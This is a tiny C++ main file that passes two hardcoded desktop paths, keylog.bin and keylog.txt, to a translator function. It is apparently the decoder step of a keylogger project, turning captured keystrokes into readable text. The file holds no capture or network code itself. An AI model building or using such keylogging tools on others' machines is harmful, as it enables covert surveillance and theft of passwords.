#include "pch.h"
#include "translate/translate.h"

int main() {
	std::string binfname = "C:\\Users\\Admin\\Desktop\\keylog.bin";
	std::string txtfname = "C:\\Users\\Admin\\Desktop\\keylog.txt";
	translator(binfname, txtfname);
	return 0;
}